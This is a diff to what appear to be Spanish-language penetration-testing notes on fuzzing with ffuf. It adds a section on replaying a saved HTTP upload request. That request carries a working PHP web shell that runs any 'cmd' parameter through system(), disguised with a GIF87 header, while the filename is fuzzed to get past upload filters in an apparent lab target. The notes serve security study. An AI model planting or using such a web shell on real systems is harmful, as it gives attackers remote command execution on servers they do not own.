@@ -109,3 +109,39 @@ ffuf -w ids.txt:FUZZ -u http://admin.$domain:$port/admin/admin.php -X POST -d 'i
 ```bash
 ffuf -w vhosts:HOSTS -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:EXT -u http://HOSTS:$port/indexEXT -x http://127.0.0.1:8080 -o doublefuzzing
 ```
+## Fuzzing desde archivo de request
+Podemos guardar la petición que queramos desde burp o desde el navegador (por ejemplo: `upload.req`) 
+
+```bash
+POST /upload.php HTTP/1.1
+Host: 154.57.164.62:30414
+User-Agent: Mozilla/5.0
+Accept: */*
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------42330482069619996332473935865
+Origin: http://154.57.164.62:30414
+Referer: http://154.57.164.62:30414/
+
+-----------------------------42330482069619996332473935865
+Content-Disposition: form-data; name="uploadFile"; filename="FUZZ"
+Content-Type: image/jpeg
+
+GIF87
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+-----------------------------42330482069619996332473935865--
+```
+y hacer fuzzing como sigue: 
+```bash
+ffuf -request upload.req -request-proto http -w .wordlist.txt
+```
